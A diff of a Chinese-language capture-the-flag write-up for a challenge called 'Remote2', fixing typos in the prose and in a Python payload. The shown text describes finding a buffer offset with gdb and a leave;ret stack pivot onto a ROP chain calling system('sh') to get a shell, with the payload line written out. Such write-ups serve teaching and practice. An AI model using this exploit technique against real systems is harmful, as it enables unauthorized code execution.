@@ -5,7 +5,7 @@ Remote2
 
 解題流程
 ----------
-程式一開始會用執行 "lsh"，之後逐字讀取 64bytes 到 buffer 上，然後就馬上 retuen。
+程式一開始會執行 "lsh"，之後逐字讀取 64bytes 到 buffer 上，然後就馬上 retuen。
 先用 gdb 觀察一下 buffer 和 rbp 的距離，rbp此時為 0x7ffc98f88e1。
 
 	(gdb) x/10gx $rsp
@@ -43,5 +43,5 @@ Remote2
 ----------
 最後，利用 leave ret 的 gadget 將 rsp 指到 ROP chain 上，並跳進第一個 gadget 開始跑，就可以拿到 shell 了！
 ```python
-'A'7 + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'A'12 + '\x2c\x00\x00\x00' + p64(buf+0x80-0x30) + p64(leave_ret)
+'A'*7 + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'A'*12 + '\x2c\x00\x00\x00' + p64(buf+0x80-0x30) + p64(leave_ret)
 ```
